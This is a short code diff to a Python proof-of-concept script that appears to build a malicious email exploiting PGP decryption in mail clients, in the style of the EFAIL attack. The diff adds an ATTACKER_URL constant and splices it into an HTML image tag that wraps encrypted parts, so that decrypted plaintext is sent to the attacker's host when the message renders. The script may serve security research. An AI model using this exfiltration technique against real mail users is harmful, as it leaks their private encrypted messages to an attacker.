@@ -10,6 +10,8 @@
 
 from __future__ import annotations
 
+ATTACKER_URL = "http://192.168.100.1:8000"
+
 import os
 import smtplib
 from email.utils import formatdate
@@ -37,14 +39,14 @@ def encrypt_inline_armor(plaintext: bytes, pubkey_path: Path) -> str:
 def main() -> int:
     secret = encrypt_inline_armor("secret message: " + os.urandom(10).hex(), PUBKEY)
 
-    armored1 = encrypt_inline_armor("""--separator2--
+    armored1 = encrypt_inline_armor(f"""--separator2--
 
 --separator1
 Content-Type: text/html
 
 <html>
 <body>
-<img src="http://192.168.100.1:8000/
+<img src="{ATTACKER_URL}/
 """, PUBKEY)
     armored2 = encrypt_inline_armor("""
 " />
